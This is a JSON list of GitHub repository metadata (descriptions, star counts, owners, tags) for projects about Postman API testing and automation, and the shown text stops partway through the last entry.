[
  {
    "user": "txthinking",
    "repo": "frank",
    "pulled": "User",
    "id": 109979004,
    "name": "frank",
    "full_name": "txthinking/frank",
    "description": "Frank is a REST API automated testing tool like Postman but in command line. Auto generate markdown API document.",
    "fork": false,
    "created_at": "2017-11-08T13:24:43Z",
    "updated_at": "2020-02-28T15:40:48Z",
    "forks": 10,
    "open_issues": 3,
    "watchers": 69,
    "network_count": 10,
    "subscribers_count": 4,
    "owner_id": 1241807,
    "owner_login": "txthinking",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/1241807?v=4",
    "owner_type": "User",
    "tags": [
      "test",
      "testing",
      "tool",
      "document",
      "auto",
      "automat",
      "line",
      "generate",
      "command",
      "automate",
      "automated",
      "command line",
      "markdown"
    ]
  },
  {
    "user": "jarroda",
    "repo": "ServiceStack.Api.Postman",
    "pulled": "User",
    "id": 19313649,
    "name": "ServiceStack.Api.Postman",
    "full_name": "jarroda/ServiceStack.Api.Postman",
    "description": "A ServiceStack plugin providing auto-generated Postman collections",
    "fork": false,
    "created_at": "2014-04-30T12:59:07Z",
    "updated_at": "2019-07-08T12:08:46Z",
    "forks": 4,
    "open_issues": 1,
    "watchers": 9,
    "network_count": 4,
    "subscribers_count": 5,
    "owner_id": 1840003,
    "owner_login": "jarroda",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/1840003?v=4",
    "owner_type": "User",
    "tags": [
      "collect",
      "collection",
      "collections",
      "auto",
      "generate",
      "plugin",
      "generated",
      "providing"
    ]
  },
  {
    "user": "JustGiving",
    "repo": "JustGiving.Api.Tools.Postman",
    "pulled": "Organization",
    "id": 21615786,
    "name": "JustGiving.Api.Tools.Postman",
    "full_name": "JustGiving/JustGiving.Api.Tools.Postman",
    "description": null,
    "fork": false,
    "created_at": "2014-07-08T14:28:10Z",
    "updated_at": "2019-12-18T16:29:10Z",
    "forks": 5,
    "open_issues": 0,
    "watchers": 3,
    "network_count": 5,
    "subscribers_count": 73,
    "owner_id": 399119,
    "owner_login": "JustGiving",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/399119?v=4",
    "owner_type": "Organization",
    "tags": []
  },
  {
    "user": "flyworker",
    "repo": "python-automation-testing",
    "pulled": "User",
    "id": 114945463,
    "name": "python-automation-testing",
    "full_name": "flyworker/python-automation-testing",
    "description": "Learn about automated software testing with Python, Selenium WebDriver, and API, Postman, focusing on web applications.",
    "fork": false,
    "created_at": "2017-12-21T00:53:26Z",
    "updated_at": "2019-12-13T04:43:38Z",
    "forks": 12,
    "open_issues": 0,
    "watchers": 3,
    "network_count": 12,
    "subscribers_count": 1,
    "owner_id": 8363795,
    "owner_login": "flyworker",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/8363795?v=4",
    "owner_type": "User",
    "tags": [
      "test",
      "testing",
      "application",
      "auto",
      "automat",
      "automate",
      "web app",
      "automated",
      "applications",
      "software",
      "river"
    ]
  },
  {
    "user": "smartive",
    "repo": "techtalk-integration-tests-postman",
    "pulled": "Organization",
    "id": 49441118,
    "name": "techtalk-integration-tests-postman",
    "full_name": "smartive/techtalk-integration-tests-postman",
    "description": "Small demo-api to show (automated) integration tests with postman and newman",
    "fork": false,
    "created_at": "2016-01-11T17:06:06Z",
    "updated_at": "2018-04-06T09:30:00Z",
    "forks": 3,
    "open_issues": 0,
    "watchers": 2,
    "network_count": 3,
    "subscribers_count": 3,
    "owner_id": 2870077,
    "owner_login": "smartive",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/2870077?v=4",
    "owner_type": "Organization",
    "tags": [
      "test",
      " postman",
      "tests",
      "tests ",
      "auto",
      "automat",
      "newman",
      "demo",
      "integration",
      "automate",
      "automated"
    ]
  },
  {
    "user": "kytmanov",
    "repo": "postmanBackup",
    "pulled": "User",
    "id": 162772141,
    "name": "postmanBackup",
    "full_name": "kytmanov/postmanBackup",
    "description": "Export Postman collections and environments automatically",
    "fork": false,
    "created_at": "2018-12-22T01:29:32Z",
    "updated_at": "2020-01-30T21:49:10Z",
    "forks": 0,
    "open_issues": 0,
    "watchers": 6,
    "network_count": 0,
    "subscribers_count": 2,
    "owner_id": 19655528,
    "owner_login": "kytmanov",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/19655528?v=4",
    "owner_type": "User",
    "tags": [
      "collect",
      "collection",
      "collections",
      "call",
      "auto",
      "automat",
      "environment",
      "environments",
      "automatic",
      "automatically"
    ]
  },
  {
    "user": "ivantw08",
    "repo": "PostmanAutoDocument",
    "pulled": "User",
    "id": 136418807,
    "name": "PostmanAutoDocument",
    "full_name": "ivantw08/PostmanAutoDocument",
    "description": "This project allow you to auto generate html file for document",
    "fork": false,
    "created_at": "2018-06-07T03:48:04Z",
    "updated_at": "2018-07-04T01:48:50Z",
    "forks": 0,
    "open_issues": 0,
    "watchers": 5,
    "network_count": 0,
    "subscribers_count": 0,
    "owner_id": 28133026,
    "owner_login": "ivantw08",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/28133026?v=4",
    "owner_type": "User",
    "tags": [
      "file",
      "document",
      "auto",
      "generate",
      "html"
    ]
  },
  {
    "user": "devopsfaith",
    "repo": "krakend-postman",
    "pulled": "Organization",
    "id": 155447231,
    "name": "krakend-postman",
    "full_name": "devopsfaith/krakend-postman",
    "description": "Create automatic POSTMAN collection descriptions from you KrakenD config file",
    "fork": false,
    "created_at": "2018-10-30T19:50:51Z",
    "updated_at": "2020-01-23T07:44:47Z",
    "forks": 1,
    "open_issues": 1,
    "watchers": 8,
    "network_count": 1,
    "subscribers_count": 2,
    "owner_id": 23139751,
    "owner_login": "devopsfaith",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/23139751?v=4",
    "owner_type": "Organization",
    "tags": [
      "collect",
      "collection",
      "file",
      "script",
      "auto",
      "automat",
      "config",
      "automatic",
      "desc",
      "description",
      "descriptions",
      "rake"
    ]
  },
  {
    "user": "my-lambda-school-projects",
    "repo": "postgres-with-postman-tdd",
    "pulled": "Organization",
    "id": 169826219,
    "name": "postgres-with-postman-tdd",
    "full_name": "my-lambda-school-projects/postgres-with-postman-tdd",
    "description": "Learning postgres with postman automated tdd",
    "fork": false,
    "created_at": "2019-02-09T03:03:27Z",
    "updated_at": "2019-07-08T20:07:15Z",
    "forks": 2,
    "open_issues": 0,
    "watchers": 2,
    "network_count": 2,
    "subscribers_count": 0,
    "owner_id": 52676069,
    "owner_login": "my-lambda-school-projects",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/52676069?v=4",
    "owner_type": "Organization",
    "tags": [
      " postman",
      "auto",
      "automat",
      "automate",
      "automated",
      "postgres"
    ]
  },
  {
    "user": "luuizeduardo",
    "repo": "postman-api-automation",
    "pulled": "User",
    "id": 190475547,
    "name": "postman-api-automation",
    "full_name": "luuizeduardo/postman-api-automation",
    "description": "API automation with Frisby.js",
    "fork": false,
    "created_at": "2019-06-05T22:10:34Z",
    "updated_at": "2020-02-04T15:21:14Z",
    "forks": 2,
    "open_issues": 1,
    "watchers": 3,
    "network_count": 2,
    "subscribers_count": 0,
    "owner_id": 36016665,
    "owner_login": "luuizeduardo",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/36016665?v=4",
    "owner_type": "User",
    "tags": [
      "auto",
      "automat",
      "automation"
    ]
  },
  {
    "id": 190475547,
    "name": "postman-api-automation",
    "full_name": "luuizeduardo/postman-api-automation",
    "description": "API automation with Frisby.js",
    "fork": false,
    "created_at": "2019-06-05T22:10:34Z",
    "updated_at": "2020-02-04T15:21:14Z",
    "stargazers_count": 3,
    "watchers_count": 3,
    "forks": 2,
    "watchers": 3,
    "score": 1,
    "owner_id": 36016665,
    "owner_login": "luuizeduardo",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/36016665?v=4",
    "pulled": 1,
    "tags": [
      "auto",
      "automat",
      "automation"
    ]
  },
  {
    "id": 179355538,
    "name": "postman",
    "full_name": "intrigue0707/postman",
    "description": "autotestpostman",
    "fork": false,
    "created_at": "2019-04-03T19:22:30Z",
    "updated_at": "2019-04-03T21:00:24Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 15210627,
    "owner_login": "intrigue0707",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/15210627?v=4",
    "tags": [
      "test",
      "auto",
      "autotestpostman",
      "autotest"
    ]
  },
  {
    "id": 161843672,
    "name": "auto-eng-proj",
    "full_name": "kostanzhoglo/auto-eng-proj",
    "description": "Some code to automate testing of API in Postman",
    "fork": false,
    "created_at": "2018-12-14T21:44:45Z",
    "updated_at": "2018-12-14T21:46:44Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 30388021,
    "owner_login": "kostanzhoglo",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/30388021?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "auto",
      "code",
      "automat",
      "automate"
    ]
  },
  {
    "id": 49441118,
    "name": "techtalk-integration-tests-postman",
    "full_name": "smartive/techtalk-integration-tests-postman",
    "description": "Small demo-api to show (automated) integration tests with postman and newman",
    "fork": false,
    "created_at": "2016-01-11T17:06:06Z",
    "updated_at": "2018-04-06T09:30:00Z",
    "stargazers_count": 2,
    "watchers_count": 2,
    "forks": 3,
    "watchers": 2,
    "score": 1,
    "owner_id": 2870077,
    "owner_login": "smartive",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/2870077?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "tests",
      "tests ",
      "auto",
      "automat",
      "newman",
      "demo",
      "integration",
      "automate",
      "automated"
    ]
  },
  {
    "id": 162772141,
    "name": "postmanBackup",
    "full_name": "kytmanov/postmanBackup",
    "description": "Export Postman collections and environments automatically",
    "fork": false,
    "created_at": "2018-12-22T01:29:32Z",
    "updated_at": "2020-01-30T21:49:10Z",
    "stargazers_count": 6,
    "watchers_count": 6,
    "forks": 0,
    "watchers": 6,
    "score": 1,
    "owner_id": 19655528,
    "owner_login": "kytmanov",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/19655528?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "collections",
      "call",
      "auto",
      "automat",
      "environment",
      "environments",
      "automatic",
      "automatically"
    ]
  },
  {
    "id": 20722266,
    "name": "postman2html",
    "full_name": "richardleggett/postman2html",
    "description": null,
    "fork": false,
    "created_at": "2014-06-11T11:06:42Z",
    "updated_at": "2019-03-04T11:17:34Z",
    "stargazers_count": 7,
    "watchers_count": 7,
    "forks": 1,
    "watchers": 7,
    "score": 1,
    "owner_id": 326436,
    "owner_login": "richardleggett",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/326436?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 136418807,
    "name": "PostmanAutoDocument",
    "full_name": "ivantw08/PostmanAutoDocument",
    "description": "This project allow you to auto generate html file for document",
    "fork": false,
    "created_at": "2018-06-07T03:48:04Z",
    "updated_at": "2018-07-04T01:48:50Z",
    "stargazers_count": 5,
    "watchers_count": 5,
    "forks": 0,
    "watchers": 5,
    "score": 1,
    "owner_id": 28133026,
    "owner_login": "ivantw08",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/28133026?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "document",
      "auto",
      "generate",
      "html"
    ]
  },
  {
    "id": 169826219,
    "name": "postgres-with-postman-tdd",
    "full_name": "my-lambda-school-projects/postgres-with-postman-tdd",
    "description": "Learning postgres with postman automated tdd",
    "fork": false,
    "created_at": "2019-02-09T03:03:27Z",
    "updated_at": "2019-07-08T20:07:15Z",
    "stargazers_count": 2,
    "watchers_count": 2,
    "forks": 2,
    "watchers": 2,
    "score": 1,
    "owner_id": 52676069,
    "owner_login": "my-lambda-school-projects",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/52676069?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "auto",
      "automat",
      "automate",
      "automated",
      "postgres"
    ]
  },
  {
    "id": 209203738,
    "name": "POSTMAN",
    "full_name": "Anirban-Talukder/POSTMAN",
    "description": "Having all the automation scripts of POSTMAN",
    "fork": false,
    "created_at": "2019-09-18T02:54:12Z",
    "updated_at": "2019-09-18T03:46:30Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 48403495,
    "owner_login": "Anirban-Talukder",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/48403495?v=4",
    "pulled": 1,
    "tags": [
      "script",
      "auto",
      "automat",
      "scripts",
      "automation"
    ]
  },
  {
    "id": 208324726,
    "name": "Postman",
    "full_name": "ZJanuik/Postman",
    "description": null,
    "fork": false,
    "created_at": "2019-09-13T18:36:06Z",
    "updated_at": "2019-09-13T18:36:06Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 55295559,
    "owner_login": "ZJanuik",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/55295559?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 104276282,
    "name": "openapi-auto-test",
    "full_name": "dtzar/openapi-auto-test",
    "description": "Automatically reads an OpenAPI 3.0 defintion and generates a Postman collection to be used with newman for automated API tests.",
    "fork": false,
    "created_at": "2017-09-20T23:03:12Z",
    "updated_at": "2019-10-23T21:39:27Z",
    "stargazers_count": 22,
    "watchers_count": 22,
    "forks": 1,
    "watchers": 22,
    "score": 1,
    "owner_id": 3578906,
    "owner_login": "dtzar",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/3578906?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "collect",
      "collection",
      "tests",
      "call",
      "auto",
      "automat",
      "newman",
      "generate",
      "read",
      "automate",
      "automated",
      "generates",
      "reads"
    ]
  },
  {
    "id": 146475696,
    "name": "pmat",
    "full_name": "josuamanuel/pmat",
    "description": "postman automation testing",
    "fork": false,
    "created_at": "2018-08-28T16:27:32Z",
    "updated_at": "2019-04-11T12:57:54Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 39583890,
    "owner_login": "josuamanuel",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/39583890?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "auto",
      "automat",
      "automation"
    ]
  },
  {
    "id": 245431735,
    "name": "postman-automatic-test-chrome-driver",
    "full_name": "sirgloveface/postman-automatic-test-chrome-driver",
    "description": "Postman automatic test project.",
    "fork": false,
    "created_at": "2020-03-06T13:50:38Z",
    "updated_at": "2020-03-09T13:17:03Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 24394097,
    "owner_login": "sirgloveface",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/24394097?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "auto",
      "automat",
      "automatic"
    ]
  },
  {
    "id": 95892938,
    "name": "postman-api",
    "full_name": "gokul87/postman-api",
    "description": "Demonstration of creating automated api test using postman framework",
    "fork": false,
    "created_at": "2017-06-30T13:53:07Z",
    "updated_at": "2017-07-28T20:39:45Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 4704837,
    "owner_login": "gokul87",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/4704837?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "auto",
      "automat",
      "framework",
      "creating",
      "automate",
      "automated"
    ]
  },
  {
    "id": 157856924,
    "name": "Postman_intern",
    "full_name": "ritikgarg1234/Postman_intern",
    "description": null,
    "fork": false,
    "created_at": "2018-11-16T11:14:54Z",
    "updated_at": "2018-11-16T11:15:39Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 28688528,
    "owner_login": "ritikgarg1234",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/28688528?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 80914274,
    "name": "postman-signing",
    "full_name": "ximik3/postman-signing",
    "description": "Postman script for automatic secure request signing.",
    "fork": false,
    "created_at": "2017-02-04T11:13:33Z",
    "updated_at": "2017-02-04T11:30:41Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 16223303,
    "owner_login": "ximik3",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/16223303?v=4",
    "pulled": 1,
    "tags": [
      "request",
      "script",
      "auto",
      "automat",
      "sign",
      "automatic",
      "signing",
      "secure"
    ]
  },
  {
    "id": 183474860,
    "name": "postman-practice",
    "full_name": "atriacca/postman-practice",
    "description": null,
    "fork": false,
    "created_at": "2019-04-25T16:50:07Z",
    "updated_at": "2019-04-28T16:22:19Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 47952462,
    "owner_login": "atriacca",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/47952462?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 168682665,
    "name": "postman-testing",
    "full_name": "JackWKelly/postman-testing",
    "description": null,
    "fork": false,
    "created_at": "2019-02-01T10:41:22Z",
    "updated_at": "2019-02-06T17:07:52Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 47181493,
    "owner_login": "JackWKelly",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/47181493?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 183025789,
    "name": "Postman-USG",
    "full_name": "johntenezaca7/Postman-USG",
    "description": "Using Postman's Newman and Jenkins to create a monitoring system for an automated testing suite.",
    "fork": false,
    "created_at": "2019-04-23T13:53:00Z",
    "updated_at": "2019-05-02T18:57:46Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 28611728,
    "owner_login": "johntenezaca7",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/28611728?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "create",
      "testing",
      "auto",
      "automat",
      "system",
      "automate",
      "automated",
      "monitor",
      "suite",
      "monitoring"
    ]
  },
  {
    "id": 174174657,
    "name": "postman-api",
    "full_name": "WondrousSquirrel/postman-api",
    "description": null,
    "fork": false,
    "created_at": "2019-03-06T15:52:03Z",
    "updated_at": "2019-03-07T16:12:25Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 18142093,
    "owner_login": "WondrousSquirrel",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/18142093?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 25633634,
    "name": "sendcloud-postman",
    "full_name": "allmonday/sendcloud-postman",
    "description": null,
    "fork": false,
    "created_at": "2014-10-23T11:28:28Z",
    "updated_at": "2014-10-24T08:04:52Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 2917822,
    "owner_login": "allmonday",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/2917822?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 199376247,
    "name": "WebApiTests",
    "full_name": "danielplawgo/WebApiTests",
    "description": "Postman - asserty w automatycznych testach",
    "fork": false,
    "created_at": "2019-07-29T04:08:40Z",
    "updated_at": "2019-10-28T04:59:03Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 70243,
    "owner_login": "danielplawgo",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/70243?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "auto",
      "automat",
      "assert",
      "asserty"
    ]
  },
  {
    "id": 114694664,
    "name": "Postman-Fundamentals",
    "full_name": "gsivaprabu/Postman-Fundamentals",
    "description": "Postman is used by over 3 million developers across the world. This course will show you the fundamentals of Postman, how you can issue requests, create automated API tests, and even document your API with Postman.",
    "fork": false,
    "created_at": "2017-12-18T22:38:26Z",
    "updated_at": "2017-12-20T04:06:05Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 2444608,
    "owner_login": "gsivaprabu",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/2444608?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "create",
      "request",
      "tests",
      "requests",
      "develop",
      "document",
      "auto",
      "automat",
      "course",
      "developer",
      "automate",
      "automated",
      "developers",
      "world",
      "issue",
      "fundamental",
      "fundamentals",
      "across",
      "million"
    ]
  },
  {
    "id": 227680669,
    "name": "postman_tools",
    "full_name": "iheartdaikaiju/postman_tools",
    "description": "Tools for automating with postman / newman",
    "fork": false,
    "created_at": "2019-12-12T19:25:45Z",
    "updated_at": "2019-12-12T19:31:36Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 58827208,
    "owner_login": "iheartdaikaiju",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/58827208?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "auto",
      "automat",
      "newman",
      "automating"
    ]
  },
  {
    "id": 228083787,
    "name": "postman-poc",
    "full_name": "rktella/postman-poc",
    "description": null,
    "fork": false,
    "created_at": "2019-12-14T20:22:46Z",
    "updated_at": "2019-12-15T12:46:31Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26424120,
    "owner_login": "rktella",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/26424120?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 243579838,
    "name": "postman_builder",
    "full_name": "fazulk/postman_builder",
    "description": "Generate postman routes automatically based upon express or koa routes",
    "fork": false,
    "created_at": "2020-02-27T17:47:27Z",
    "updated_at": "2020-03-27T22:48:21Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 21964900,
    "owner_login": "fazulk",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/21964900?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "call",
      "based",
      "express",
      "auto",
      "automat",
      " express",
      "route",
      "routes",
      "automatic",
      "automatically",
      "upon"
    ]
  },
  {
    "id": 29505796,
    "name": "chinese-postman",
    "full_name": "andreyluiz/chinese-postman",
    "description": null,
    "fork": false,
    "created_at": "2015-01-20T01:33:46Z",
    "updated_at": "2015-01-20T01:37:20Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 1965897,
    "owner_login": "andreyluiz",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/1965897?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 222237606,
    "name": "postman-collection-watcher",
    "full_name": "joachimdalen/postman-collection-watcher",
    "description": "A utility to automatically update and notify you when postman collection can be updated",
    "fork": false,
    "created_at": "2019-11-17T11:29:02Z",
    "updated_at": "2019-11-24T07:09:01Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 15696189,
    "owner_login": "joachimdalen",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/15696189?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "postman collection",
      "call",
      "auto",
      "automat",
      "util",
      "update",
      "automatic",
      "utility",
      "automatically",
      "updated",
      "notify"
    ]
  },
  {
    "id": 198227511,
    "name": "LoftSmartPostmanCollection",
    "full_name": "PiniazikValery/LoftSmartPostmanCollection",
    "description": null,
    "fork": false,
    "created_at": "2019-07-22T13:20:27Z",
    "updated_at": "2019-08-14T11:13:49Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 36072114,
    "owner_login": "PiniazikValery",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/36072114?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 206777878,
    "name": "swagger2postman",
    "full_name": "sarmadsaleem/swagger2postman",
    "description": null,
    "fork": false,
    "created_at": "2019-09-06T11:16:34Z",
    "updated_at": "2019-10-30T00:56:55Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 6636327,
    "owner_login": "sarmadsaleem",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/6636327?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 131221156,
    "name": "postman_rest_api_test_automation",
    "full_name": "DanSchon/postman_rest_api_test_automation",
    "description": "built an automated end to end rest api test collection",
    "fork": false,
    "created_at": "2018-04-26T23:31:21Z",
    "updated_at": "2018-04-26T23:33:03Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 13282339,
    "owner_login": "DanSchon",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/13282339?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "collect",
      "collection",
      "rest",
      "auto",
      "automat",
      "built",
      "automate",
      "rest api",
      "automated",
      "end to end"
    ]
  },
  {
    "id": 201767628,
    "name": "projeto_WebService_API_Postman",
    "full_name": "marianamunizlima/projeto_WebService_API_Postman",
    "description": null,
    "fork": false,
    "created_at": "2019-08-11T13:23:04Z",
    "updated_at": "2019-08-11T13:55:21Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 12008835,
    "owner_login": "marianamunizlima",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/12008835?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 132407170,
    "name": "IMIbotAPIs",
    "full_name": "sravaniimi/IMIbotAPIs",
    "description": "APIs automation using postman",
    "fork": false,
    "created_at": "2018-05-07T04:29:39Z",
    "updated_at": "2018-05-07T04:29:41Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 39042486,
    "owner_login": "sravaniimi",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/39042486?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "auto",
      "automat",
      "automation"
    ]
  },
  {
    "id": 197828550,
    "name": "apiAutomationPostman",
    "full_name": "baraatia/apiAutomationPostman",
    "description": "contains api automation project using post man",
    "fork": false,
    "created_at": "2019-07-19T19:07:28Z",
    "updated_at": "2019-07-20T07:39:29Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 48246069,
    "owner_login": "baraatia",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/48246069?v=4",
    "pulled": 1,
    "tags": [
      "auto",
      "automat",
      "contain",
      "automation"
    ]
  },
  {
    "id": 145978819,
    "name": "Rest-api-collections",
    "full_name": "Srinu1928/Rest-api-collections",
    "description": "API collections automated through POSTMAN",
    "fork": false,
    "created_at": "2018-08-24T10:37:01Z",
    "updated_at": "2018-08-24T10:37:01Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 42632435,
    "owner_login": "Srinu1928",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/42632435?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "collections",
      "auto",
      "automat",
      "automate",
      "automated"
    ]
  },
  {
    "id": 83566258,
    "name": "PostmanRESTService",
    "full_name": "jameswentworth/PostmanRESTService",
    "description": "Structuring tests for API Web REST Service testing and automation using Java, JS etc.",
    "fork": false,
    "created_at": "2017-03-01T14:54:18Z",
    "updated_at": "2017-03-01T14:54:18Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 26117494,
    "owner_login": "jameswentworth",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/26117494?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "tests",
      "tests ",
      "auto",
      "automat",
      "automation"
    ]
  },
  {
    "id": 220044376,
    "name": "postmanAutomationAnimalFacts",
    "full_name": "Ghop11/postmanAutomationAnimalFacts",
    "description": "API automation for animal facts. https://alexwohlbruck.github.io/cat-facts/docs/endpoints/facts.html",
    "fork": false,
    "created_at": "2019-11-06T16:43:13Z",
    "updated_at": "2019-11-06T16:51:17Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 17090675,
    "owner_login": "Ghop11",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/17090675?v=4",
    "pulled": 1,
    "tags": [
      "http",
      "auto",
      "automat",
      "endpoint",
      "points",
      "https",
      "endpoints",
      "automation",
      "html",
      "github",
      "docs",
      "facts",
      "animal"
    ]
  },
  {
    "id": 157771686,
    "name": "LearningPostmanApiTest",
    "full_name": "CaiqueCoelho/LearningPostmanApiTest",
    "description": "Learning Postman Api tests with Jenkins and Newman for automation tests",
    "fork": false,
    "created_at": "2018-11-15T20:57:01Z",
    "updated_at": "2018-11-15T20:58:56Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
